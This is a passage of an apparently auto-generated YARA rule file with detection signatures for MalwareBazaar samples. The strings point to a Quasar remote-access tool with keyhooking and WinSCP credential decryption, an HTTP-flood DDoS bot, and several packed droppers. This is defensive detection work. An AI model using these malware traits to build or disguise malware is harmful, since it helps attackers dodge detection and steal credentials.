rule Windows_85346857515bcff04f4ec8aa4b906e12eff6073de9273d99113621cd30cce659
{
    meta:
        description = "Auto ML: 85346857515bcff04f4ec8aa4b906e12eff6073de9273d99113621cd30cce659"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Ofcau.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "<Module>{463821c3-e8d6-4926-ab3f-f1a862595cac}"
        $s8 = "insert_ASSETAt"
        $s9 = "connectioncounter"
        $s10 = "offsetparam"
        $s11 = "System.Linq"
        $s12 = "System.Core"
        $s13 = "System.Collections.Generic"
        $s14 = "System.Reflection"
        $s15 = "Load"
        $s16 = "System.IO"
        $s17 = "StreamWriter"
        $s18 = "AssetMock"
        $s19 = "ConnectGlobal"
        $s20 = "GetTypeFromHandle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 834KB and
        all of them
}

rule Windows_8555743631267a78de02ae65d5454e3bfc2ac6c5336dab259fcff5316aba840c
{
    meta:
        description = "Auto ML: 8555743631267a78de02ae65d5454e3bfc2ac6c5336dab259fcff5316aba840c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Linux_857ba333550532909f31ffe349202e1fed7e159eb329dbc949ea6e8cd79fcfad
{
    meta:
        description = "Auto ML: 857ba333550532909f31ffe349202e1fed7e159eb329dbc949ea6e8cd79fcfad"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36"
        $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
        $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
        $s6 = "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s7 = "dayzddos.co runs you if you read this lol then you tcp dumped it because it hit you and you need to patch it lololololol"
        $s8 = "%s %s HTTP/1.1"
        $s9 = "User-Agent: %s"
        $s10 = "Connection: close"
        $s11 = "%s /cdn-cgi/l/chk_captcha HTTP/1.1"
        $s12 = "HTTPSTOPM"
        $s13 = "HTTP"
        $s14 = "No such file or directory"
        $s15 = "No such process"
        $s16 = "Interrupted system call"
        $s17 = "Bad file descriptor"
        $s18 = "No child processes"
        $s19 = "Resource temporarily unavailable"
        $s20 = "File exists"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 87KB and
        all of them
}

rule Windows_858935b8075312dbe37a7b1916d92ee6c19df3f260d0809b3a97b886297a86e3
{
    meta:
        description = "Auto ML: 858935b8075312dbe37a7b1916d92ee6c19df3f260d0809b3a97b886297a86e3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3925KB and
        all of them
}

rule Linux_0c2642d10807bba762a5a257e20f3dbbc8cbb31ea1d784112e9f4a77f4acbde0
{
    meta:
        description = "Auto ML: 0c2642d10807bba762a5a257e20f3dbbc8cbb31ea1d784112e9f4a77f4acbde0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuMozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 116KB and
        all of them
}

rule Windows_85e7587a2013104dae85c32865728f1176a555502c4c594faf7ebf68ae2773f1
{
    meta:
        description = "Auto ML: 85e7587a2013104dae85c32865728f1176a555502c4c594faf7ebf68ae2773f1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "EgET"
        $s6 = "CorExitProcess"
        $s7 = "An application has made an attempt to load the C runtime library incorrectly."
        $s8 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s9 = "- Attempt to initialize the CRT more than once."
        $s10 = "- unable to open console device"
        $s11 = "- unexpected multithread lock error"
        $s12 = "- not enough space for thread data"
        $s13 = "- floating point support not loaded"
        $s14 = "FlsSetValue"
        $s15 = "FlsGetValue"
        $s16 = "GAIsProcessorFeaturePresent"
        $s17 = "KERNEL32"
        $s18 = "GetProcessWindowStation"
        $s19 = "GetUserObjectInformationA"
        $s20 = "GetLastActivePopup"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 205KB and
        all of them
}

rule Windows_85fa3bba1c836ac87b3bede3666032cf869ac536095b22cd661ad930f631bb87
{
    meta:
        description = "Auto ML: 85fa3bba1c836ac87b3bede3666032cf869ac536095b22cd661ad930f631bb87"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Core"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "rtlget6DonTh4I0CqPh"
        $s13 = "System.IO"
        $s14 = "uwyJyCEgCMDidwG6VM3"
        $s15 = "CieYOsETMIopnsAqMJ7"
        $s16 = "<Module>{F738F0CE-50CA-421C-B596-6A2B6E43CA2B}"
        $s17 = "System.Text"
        $s18 = "get_Length"
        $s19 = "get_Chars"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1726KB and
        all of them
}

rule Windows_860ea5b26b4297ef791f2bf7be670c89f5771a2384974c8fd1de9c862ecc338e
{
    meta:
        description = "Auto ML: 860ea5b26b4297ef791f2bf7be670c89f5771a2384974c8fd1de9c862ecc338e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 211KB and
        all of them
}

rule Windows_861f5ebaad65712e0c699fe6fad2f63cca3f35759ed92f44db0d6d089889d209
{
    meta:
        description = "Auto ML: 861f5ebaad65712e0c699fe6fad2f63cca3f35759ed92f44db0d6d089889d209"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "System.Xml.Schema"
        $s7 = "GetTypedTableSchema"
        $s8 = "ReadXmlSchema"
        $s9 = "WriteXmlSchema"
        $s10 = "GetTypedDataSetSchema"
        $s11 = "System.Data"
        $s12 = "GetSerializationData"
        $s13 = "GetData"
        $s14 = "get_mRbb"
        $s15 = "System.Collections.Generic"
        $s16 = "Read"
        $s17 = "add_Load"
        $s18 = "HomeCarStore_Load"
        $s19 = "SetAdded"
        $s20 = "set_Enabled"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 575KB and
        all of them
}

rule Linux_863e02d47d369a12c5d6129300e98df3c493a163f42477fab6498f9ce003f31a
{
    meta:
        description = "Auto ML: 863e02d47d369a12c5d6129300e98df3c493a163f42477fab6498f9ce003f31a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 24KB and
        all of them
}

rule Windows_8640e6333193359bb71c47135ffdd3011eaf882c3987a7c6d54490d15b537486
{
    meta:
        description = "Auto ML: 8640e6333193359bb71c47135ffdd3011eaf882c3987a7c6d54490d15b537486"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2419KB and
        all of them
}

rule Windows_864535296e9af54c499f6c263b0e892c0c21194b4e3b9ec4f2e1514004d5b147
{
    meta:
        description = "Auto ML: 864535296e9af54c499f6c263b0e892c0c21194b4e3b9ec4f2e1514004d5b147"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1992KB and
        all of them
}

rule Windows_8647351f3a2882d4d6c37d3d41e4c42b1bdc80d61f9f7572e262f7e7381b9144
{
    meta:
        description = "Auto ML: 8647351f3a2882d4d6c37d3d41e4c42b1bdc80d61f9f7572e262f7e7381b9144"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2544KB and
        all of them
}

rule Linux_8649f64e8a9ffe0dc1e203412f4a409078e856f39a896353057925eed7457e89
{
    meta:
        description = "Auto ML: 8649f64e8a9ffe0dc1e203412f4a409078e856f39a896353057925eed7457e89"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 55KB and
        all of them
}

rule Windows_8655d011d45616085cb2ec5d7cb594757b66e6ac7e3fe9b11d09dfb410884e07
{
    meta:
        description = "Auto ML: 8655d011d45616085cb2ec5d7cb594757b66e6ac7e3fe9b11d09dfb410884e07"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6258KB and
        all of them
}

rule Windows_0c482a3a2510cf8f323c5c4d9097850be9e77f09cf163b1de2c2220cfad3beb8
{
    meta:
        description = "Auto ML: 0c482a3a2510cf8f323c5c4d9097850be9e77f09cf163b1de2c2220cfad3beb8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "(3b0ToKq82F6cECVBnPiu,System.Private.CoreLib"
        $s7 = "4System.Private.CoreLib.dll"
        $s8 = "4System.Diagnostics.Process"
        $s9 = "<System.Diagnostics.Process.dll"
        $s10 = "@System.ComponentModel.Primitives"
        $s11 = "HSystem.ComponentModel.Primitives.dll"
        $s12 = "$System.ObjectModel"
        $s13 = ",System.ObjectModel.dll"
        $s14 = "System.Linq"
        $s15 = "System.Linq.dll"
        $s16 = "System"
        $s17 = "System.dllFSystem.ComponentModel.TypeConverter"
        $s18 = "NSystem.ComponentModel.TypeConverter.dll"
        $s19 = ":System.Collections.NonGeneric"
        $s20 = "BSystem.Collections.NonGeneric.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5400KB and
        all of them
}

rule Windows_86f1a75b8dd44fc6982db418c457e07caaebcb6c426d2953439b79cc8b16e180
{
    meta:
        description = "Auto ML: 86f1a75b8dd44fc6982db418c457e07caaebcb6c426d2953439b79cc8b16e180"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
        $s3 = "WSAGetLastError"
        $s4 = "__WSAFDIsSet"
        $s5 = "closesocket"
        $s6 = "connect"
        $s7 = "gethostbyname"
        $s8 = "ioctlsocket"
        $s9 = "socket"
        $s10 = "CoCreateInstance"
        $s11 = "DeleteUrlCacheEntry"
        $s12 = "ExitProcess"
        $s13 = "ExitThread"
        $s14 = "FileTimeToLocalFileTime"
        $s15 = "FileTimeToSystemTime"
        $s16 = "FindClose"
        $s17 = "FindFirstFileA"
        $s18 = "FindNextFileA"
        $s19 = "GetCommandLineA"
        $s20 = "GetCurrentProcessId"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 136KB and
        all of them
}

rule Windows_8704970ac644f9c7eec883f809720177ff9992fe745607329d2e68f82c0c11b1
{
    meta:
        description = "Auto ML: 8704970ac644f9c7eec883f809720177ff9992fe745607329d2e68f82c0c11b1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "graphs_and_percentages_for_calculations.exe"
        $s13 = "<Module>"
        $s14 = "ThreadSafeObjectProvider`1"
        $s15 = "MySettings"
        $s16 = "ApplicationSettingsBase"
        $s17 = "System.Configuration"
        $s18 = "MySettingsProperty"
        $s19 = "System.Windows.Forms"
        $s20 = "<Module>{DD9989D5-546E-4BAC-BEC6-EFED6A265E9F}"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3681KB and
        all of them
}

rule Linux_8704eb337ed465539d3446057dde253f9f24bcf8646a35e934df21b76a236e1d
{
    meta:
        description = "Auto ML: 8704eb337ed465539d3446057dde253f9f24bcf8646a35e934df21b76a236e1d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 32KB and
        all of them
}

rule Windows_870765abf32cfe3a2f7c47fbe4c8ec968a97676935ae0c062437c98d88215d98
{
    meta:
        description = "Auto ML: 870765abf32cfe3a2f7c47fbe4c8ec968a97676935ae0c062437c98d88215d98"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2418KB and
        all of them
}

rule Windows_873546478ec547e4e82af18fa5004c67794141d9cb98e79a4ff84c86a6c6aeb8
{
    meta:
        description = "Auto ML: 873546478ec547e4e82af18fa5004c67794141d9cb98e79a4ff84c86a6c6aeb8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "`.rsrc"
        $s6 = "<Module>"
        $s7 = "Newtonsoft.Json.dll"
        $s8 = "BsonBinaryWriter"
        $s9 = "JsonReader"
        $s10 = "BsonReader"
        $s11 = "BsonReaderState"
        $s12 = "JsonWriter"
        $s13 = "BsonWriter"
        $s14 = "DataSetConverter"
        $s15 = "ITraceWriter"
        $s16 = "DiagnosticsTraceWriter"
        $s17 = "MemoryTraceWriter"
        $s18 = "JsonSerializerSettings"
        $s19 = "JsonValidatingReader"
        $s20 = "XProcessingInstructionWrapper"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 551KB and
        all of them
}

rule Windows_87545d25bd7ba1490287b40c178d3b75765457565caa7d27a801d8a2e21d5fd3
{
    meta:
        description = "Auto ML: 87545d25bd7ba1490287b40c178d3b75765457565caa7d27a801d8a2e21d5fd3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6344KB and
        all of them
}

rule Windows_8769e71a46cb1b735e48564e99dc77427323ae40e7dc5eff43dd00444e041354
{
    meta:
        description = "Auto ML: 8769e71a46cb1b735e48564e99dc77427323ae40e7dc5eff43dd00444e041354"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "https://d.symcb.com/cps0%"
        $s4 = "https://d.symcb.com/rpa0."
        $s5 = "http://s.symcd.com06"
        $s6 = "%http://s.symcb.com/universal-root.crl0"
        $s7 = "https://d.symcb.com/rpa0@"
        $s8 = "/http://ts-crl.ws.symantec.com/sha256-tss-ca.crl0"
        $s9 = "http://ts-ocsp.ws.symantec.com0;"
        $s10 = "/http://ts-aia.ws.symantec.com/sha256-tss-ca.cer0("
        $s11 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s12 = "http://pki-ocsp.symauth.com0"
        $s13 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s14 = "kernel32.dll"
        $s15 = "user32.dll"
        $s16 = "advapi32.dll"
        $s17 = "oleaut32.dll"
        $s18 = "shell32.dll"
        $s19 = "version.dll"
        $s20 = "mscoree.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5787KB and
        all of them
}

rule Windows_879652c40641501a93a824425a88b116ad4d8fe81ed937a1ef7794ac64b0dfa4
{
    meta:
        description = "Auto ML: 879652c40641501a93a824425a88b116ad4d8fe81ed937a1ef7794ac64b0dfa4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "AES for Intel AES-NI, CRYPTOGAMS by <appro@openssl.org>"
        $s7 = "AES-NI GCM module for x86_64, CRYPTOGAMS by <appro@openssl.org>"
        $s8 = "AES for x86_64, CRYPTOGAMS by <appro@openssl.org>"
        $s9 = "GHASH for x86_64, CRYPTOGAMS by <appro@openssl.org>"
        $s10 = "SHA1 block transform for x86_64, CRYPTOGAMS by <appro@openssl.org>"
        $s11 = "Montgomery Multiplication with scatter/gather for x86_64, CRYPTOGAMS by <appro@openssl.org>"
        $s12 = "Montgomery Multiplication for x86_64, CRYPTOGAMS by <appro@openssl.org>"
        $s13 = "Camellia for x86_64 by <appro@openssl.org>"
        $s14 = "SHA256 multi-block transform for x86_64, CRYPTOGAMS by <appro@openssl.org>"
        $s15 = "SHA256 block transform for x86_64, CRYPTOGAMS by <appro@openssl.org>"
        $s16 = "AESNI-CBC+SHA256 stitch for x86_64, CRYPTOGAMS by <appro@openssl.org>"
        $s17 = "SHA1 multi-block transform for x86_64, CRYPTOGAMS by <appro@openssl.org>"
        $s18 = "AESNI-CBC+SHA1 stitch for x86_64, CRYPTOGAMS by <appro@openssl.org>"
        $s19 = "RC4 for x86_64, CRYPTOGAMS by <appro@openssl.org>"
        $s20 = "SHA512 block transform for x86_64, CRYPTOGAMS by <appro@openssl.org>"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 35438KB and
        all of them
}

rule Windows_87a11f0978c920e56e599a311e1dcab9fc287bf194de9622100cd44cb5c600de
{
    meta:
        description = "Auto ML: 87a11f0978c920e56e599a311e1dcab9fc287bf194de9622100cd44cb5c600de"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
